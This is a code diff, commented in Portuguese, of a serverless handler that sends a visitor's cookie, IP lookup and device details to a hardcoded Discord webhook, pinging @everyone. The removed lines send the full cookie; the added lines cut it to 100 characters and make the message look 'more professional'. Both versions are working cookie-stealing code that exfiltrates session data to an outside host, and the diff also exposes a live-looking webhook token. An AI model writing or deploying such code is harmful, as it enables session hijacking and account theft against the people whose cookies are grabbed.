@@ -31,10 +31,10 @@ export default async function handler(req, res) {
       console.error('Erro ao buscar info do IP:', e);
     }
 
-    // WEBHOOK DO DISCORD
+    // SUA WEBHOOK AQUI - SEGURA NO BACKEND
     const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';
 
-    // 🔥 CRIAR MENSAGEM COM COOKIE COMPLETO 🔥
+    // Criar mensagem mais profissional
     const embed = {
       content: '@everyone',
       embeds: [{
@@ -43,8 +43,8 @@ export default async function handler(req, res) {
         color: 0x6366f1,
         fields: [
           {
-            name: '🍪 **COOKIE COMPLETO**',
-            value: '```' + cookie + '```' // ✅ AGORA VAI COMPLETO, SEM CORTAR!
+            name: '🍪 **COOKIE**',
+            value: '```' + cookie.substring(0, 100) + (cookie.length > 100 ? '...' : '') + '```'
           },
           {
             name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
@@ -81,11 +81,6 @@ Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
           {
             name: '🔢 **ID DA SESSÃO**',
             value: `\`${generateSessionId()}\``,
-            inline: true
-          },
-          {
-            name: '📏 **TAMANHO DO COOKIE**',
-            value: `\`${cookie.length} caracteres\``,
             inline: true
           }
         ],
